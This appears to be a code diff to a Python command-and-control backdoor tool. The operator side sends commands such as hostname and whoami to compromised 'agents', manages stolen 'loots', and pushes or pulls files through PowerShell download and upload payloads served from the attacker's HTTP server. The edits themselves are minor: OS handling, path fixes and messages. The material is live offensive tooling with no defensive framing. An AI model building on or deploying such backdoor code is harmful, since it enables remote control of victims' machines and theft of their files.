@@ -2,7 +2,7 @@ from .common import *
 from .settings import HTTPFileServerSettings, CoreSettings
 from .session_manager import SessionManager
 from .database import AgentsDB
-from .payloads import powershell_download_file, powershell_upload_file_ssl, powershell_upload_file, powershell_download_file_ssl
+from .payloads.Modules import powershell_download_file, powershell_upload_file_ssl, powershell_upload_file, powershell_download_file_ssl
 
 from http.server import BaseHTTPRequestHandler
 from base64 import b64decode
@@ -30,14 +30,7 @@ class Agent:
 
             if "Windows" not in response:
 
-                os_type = "Linux"
-
-                self.send_command("hostname")
-                hostname = self.receive_all()
-
-                self.send_command("whoami")
-                user = self.receive_all()
-
+                print(f"\n\n{ALERT} Failed to establish backdoor session with {YELLOW}{agent_ip}{RST}: Unsupported OS")
 
             else:
 
@@ -50,7 +43,7 @@ class Agent:
                 hostname = response[0].upper()
                 user = response[1].strip('\r')
 
-            return user, hostname, os_type
+                return user, hostname, os_type
 
 
         except ConnectionResetError:
@@ -287,7 +280,7 @@ class Agent:
                     elif main_arg == "loots":
 
                         loots_path = SessionManager.loots_paths[list(SessionManager.current_session.keys())[0]]
-                        display_loots(loots_path)
+                        open_loot(loots_path)
 
                     elif main_arg == "upload":
 
@@ -381,8 +374,8 @@ class Agent:
 
             local_file_name = os.path.basename(local_path)
 
-            if upload_path[-1] != "/" and upload_path[-1] != "\\":
-                upload_path = upload_path + "\\"
+            #if upload_path[-1] != "/" and upload_path[-1] != "\\":
+               #upload_path = upload_path + "\\"
 
             upload_file_name = os.path.basename(upload_path.replace("\\", "/"))
 
@@ -392,6 +385,8 @@ class Agent:
             upload_path = upload_path.replace(upload_file_name, '')
 
             if self.file_path_exists(upload_path):
+
+                upload_path += upload_file_name
 
                 server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{local_file_name}"
 
@@ -404,7 +399,6 @@ class Agent:
 
                     self.send_command(upload_payload)
                     self.receive_all()
-                    print(f"{ADD} File successfully uploaded\n")
 
                 except ConnectionError:
 
@@ -415,11 +409,11 @@ class Agent:
                     print(f"\n{ERROR} Failed to upload file: Unknown error occurred\n")
 
             else:
-                print(f'\n{ALERT} Upload path "{YELLOW}{upload_path}{RST}" not found\n')
+                print(f'\n{ALERT} Upload path {YELLOW}{upload_path}{RST} not found\n')
                 return
 
         else:
-            print(f'\n{ALERT} File "{YELLOW}{local_path}{RST}" not found\n')
+            print(f'\n{ALERT} File {YELLOW}{local_path}{RST} not found\n')
             return
 
 
@@ -479,7 +473,7 @@ class Agent:
 
 
         else:
-            print(f'\n{ALERT} File "{YELLOW}{file_path}{RST}" not found\n')
+            print(f'\n{ALERT} File {YELLOW}{file_path}{RST} not found\n')
 
 
     
@@ -511,7 +505,9 @@ class FileHandler(BaseHTTPRequestHandler):
                     pr_bar.update(len(data))
 
                 pr_bar.close()
-                    
+
+                print(f"{ADD} File successfully uploaded\n")
+
         except FileNotFoundError:
 
             print(f"\n{ALERT} File not found: {YELLOW}{self.filePath}{RST}")
@@ -542,7 +538,7 @@ class FileHandler(BaseHTTPRequestHandler):
                     
         self.send_response(200)
         self.end_headers()
-                 
+
 
     def log_message(self, format, *args):
         return
